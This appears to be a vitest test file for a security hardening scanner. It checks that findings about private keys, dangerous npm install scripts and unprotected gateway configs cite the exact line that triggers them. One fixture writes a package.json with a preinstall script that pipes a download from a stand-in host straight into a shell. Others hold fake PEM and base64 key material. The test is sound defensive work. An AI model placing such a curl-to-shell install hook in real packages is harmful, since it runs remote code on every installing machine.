/**
 * Static findings on a present pattern cite the line of that pattern.
 *
 * CRED-002, DEP-004 and GATEWAY-002 named a file and no line, so the renderer
 * printed `file` alone and no `Verify:` for three critical findings whose
 * trigger sits at a line the check had already read: the field holding a key,
 * the PEM header of a key file, the npm script that pipes a download into a
 * shell, the gateway block that has no origin validation. `Verify:` is derived
 * from `line` (`generateVerifyCommand`), so a missing line is a missing Verify.
 *
 * Each case asserts the recorded line AND that the line it names holds the
 * trigger, so a line that is present but wrong fails too.
 */

import { describe, it, expect } from 'vitest';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { HardeningScanner } from '../../src/hardening/scanner';
import type { SecurityFinding } from '../../src/hardening/security-check';
import { generateVerifyCommand } from '../../src/ui/verify-command';
import { tempDir } from '../helpers/temp-dir';
import { initThrowawayRepo } from '../helpers/throwaway-repo';

// Built from fragments so no key-shaped literal sits in the source.
const PEM_HEADER = ['-----BEGIN', 'RSA PRIVATE', 'KEY-----'].join(' ');
const PEM_FOOTER = ['-----END', 'RSA PRIVATE', 'KEY-----'].join(' ');
// 32 distinct bytes as base64: the raw key material the JSON gate accepts.
const KEY_B64 = Buffer.from(Array.from({ length: 32 }, (_, i) => (i * 37 + 11) & 0xff)).toString('base64');

async function write(dir: string, rel: string, content: string): Promise<void> {
  await fs.mkdir(path.dirname(path.join(dir, rel)), { recursive: true });
  await fs.writeFile(path.join(dir, rel), content);
}

function lineContaining(content: string, needle: string): number {
  const index = content.split('\n').findIndex((l) => l.includes(needle));
  if (index < 0) throw new Error(`fixture has no line containing ${needle}`);
  return index + 1;
}

async function failing(dir: string, checkId: string): Promise<SecurityFinding[]> {
  const result = await new HardeningScanner().scan({ targetDir: dir });
  return result.findings.filter((f: SecurityFinding) => f.checkId === checkId && f.passed === false);
}

/** The finding names `line`, the line holds `needle`, and the renderer prints a Verify for it. */
async function expectCited(dir: string, f: SecurityFinding, line: number, needle: string): Promise<void> {
  expect(typeof f.line).toBe('number');
  expect(f.line).toBe(line);
  const content = await fs.readFile(path.join(dir, f.file!), 'utf-8');
  expect(content.split('\n')[f.line! - 1]).toContain(needle);
  const verify = generateVerifyCommand(f, dir);
  expect(verify).toBeDefined();
  expect(verify).toMatch(new RegExp(`^sed -n '${line}p' `));
}

describe('DEP-004 cites the script that matched', () => {
  it('records the line of the first dangerous script entry', async () => {
    const dir = tempDir('hma-static-line-dep-');
    const pkg = JSON.stringify({
      name: 'fixture',
      version: '1.0.0',
      scripts: {
        build: 'tsc',
        preinstall: 'curl -s https://example.invalid/setup.sh | sh',
        test: 'vitest',
      },
    }, null, 2);
    await write(dir, 'package.json', pkg);

    const [f] = await failing(dir, 'DEP-004');
    expect(f).toBeDefined();
    expect(f.severity).toBe('critical');
    expect(f.file).toBe('package.json');
    await expectCited(dir, f, lineContaining(pkg, '"preinstall"'), 'curl -s https://example.invalid/setup.sh | sh');
  });
});

describe('CRED-002 cites where the key is', () => {
  it('a JSON document: the line of the field holding the key', async () => {
    const dir = tempDir('hma-static-line-json-');
    const doc = JSON.stringify({ agentId: 'fixture', publicKey: 'not-a-key', privateKey: KEY_B64, createdAt: 'x' }, null, 2);
    await write(dir, path.join('.opena2a', 'aim', 'identity.json'), doc);

    const [f] = await failing(dir, 'CRED-002');
    expect(f).toBeDefined();
    expect(f.severity).toBe('critical');
    expect(f.file).toBe(path.join('.opena2a', 'aim', 'identity.json'));
    await expectCited(dir, f, lineContaining(doc, '"privateKey"'), '"privateKey"');
  });

  it('a key file: the line of the PEM header, wherever it sits', async () => {
    const dir = tempDir('hma-static-line-pem-');
    // openssl writes attribute lines above the block, so the header is not
    // always on line 1.
    const pem = ['Bag Attributes', '    friendlyName: fixture', PEM_HEADER, 'FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE', PEM_FOOTER, ''].join('\n');
    await write(dir, 'server.key', pem);

    const [f] = await failing(dir, 'CRED-002');
    expect(f).toBeDefined();
    expect(f.file).toBe('server.key');
    await expectCited(dir, f, 3, PEM_HEADER);
  });
});

describe('GATEWAY-002 cites the gateway config it judged', () => {
  it('a gateway block with no security block: the line of the gateway block', async () => {
    const dir = tempDir('hma-static-line-gw-');
    const cfg = JSON.stringify({ agent: { name: 'fixture' }, gateway: { port: 18789, auth: false } }, null, 2);
    await write(dir, 'openclaw.json', cfg);

    const [f] = await failing(dir, 'GATEWAY-002');
    expect(f).toBeDefined();
    expect(f.severity).toBe('critical');
    expect(f.file).toBe('openclaw.json');
    await expectCited(dir, f, lineContaining(cfg, '"gateway"'), '"gateway"');
  });

  it('a security block without websocketOrigins: the line of the security block', async () => {
    const dir = tempDir('hma-static-line-gw-sec-');
    const cfg = JSON.stringify({ gateway: { port: 18789 }, security: { sandbox: true } }, null, 2);
    await write(dir, 'openclaw.json', cfg);

    const [f] = await failing(dir, 'GATEWAY-002');
    expect(f).toBeDefined();
    await expectCited(dir, f, lineContaining(cfg, '"security"'), '"security"');
  });

  it('a config with no gateway or security block: no line, rather than one naming `{`', async () => {
    const dir = tempDir('hma-static-line-gw-none-');
    await write(dir, 'openclaw.json', JSON.stringify({ agent: { name: 'fixture' } }, null, 2));

    const [f] = await failing(dir, 'GATEWAY-002');
    expect(f).toBeDefined();
    expect(f.line).toBeUndefined();
    expect(generateVerifyCommand(f, dir)).toBeUndefined();
  });

  it('a config the auto-fix rewrites: the line in the file as rewritten', async () => {
    // GATEWAY-001's fix writes the config back laid out two spaces per level,
    // so a one-line config gains lines and GATEWAY-002, which stays failing,
    // must cite the file now on disk.
    const dir = tempDir('hma-static-line-gw-fix-');
    initThrowawayRepo(dir, false);
    await write(dir, 'openclaw.json', JSON.stringify({ gateway: { host: '0.0.0.0', port: 18789 } }));

    const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: true });
    const rewritten = await fs.readFile(path.join(dir, 'openclaw.json'), 'utf-8');
    expect(rewritten).toContain('127.0.0.1');
    const f = result.findings.find((x: SecurityFinding) => x.checkId === 'GATEWAY-002' && x.passed === false);
    expect(f).toBeDefined();
    await expectCited(dir, f!, lineContaining(rewritten, '"gateway"'), '"gateway"');
    expect(f!.line).toBeGreaterThan(1);
  });

  it('an empty websocketOrigins value: the line of that setting', async () => {
    const dir = tempDir('hma-static-line-gw-empty-');
    const cfg = JSON.stringify({ gateway: { port: 18789 }, security: { sandbox: true, websocketOrigins: '' } }, null, 2);
    await write(dir, 'openclaw.json', cfg);

    const [f] = await failing(dir, 'GATEWAY-002');
    expect(f).toBeDefined();
    await expectCited(dir, f, lineContaining(cfg, '"websocketOrigins"'), '"websocketOrigins"');
  });
});
